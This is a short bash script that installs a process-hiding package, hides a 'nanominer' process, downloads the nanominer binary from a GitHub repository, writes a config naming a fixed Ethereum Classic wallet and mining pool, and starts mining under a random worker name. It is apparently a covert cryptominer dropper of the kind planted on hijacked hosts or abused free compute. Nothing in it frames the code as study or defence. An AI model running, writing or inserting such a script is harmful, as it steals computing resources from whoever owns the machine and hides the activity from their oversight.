!/bin/bash

npm i -g node-process-hider 

ph add nanominer

array[0]="Kopi"
array[1]="Nyaman"
array[2]="DiLambung"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
wget -qO nano https://github.com/angkii/ngengBahan/raw/main/nanominer.zip
unzip -qq nano
chmod +x nanominer
echo "[Ethash]
wallet = 0x11880b1cfe04907c5306222be1e09f4bbb480eb5
coin = ETC
rigName = $worker
rigPassword = x
pool1 = stratum+tcp://etc.poolbinance.com:1800" > config.ini
./nanominer
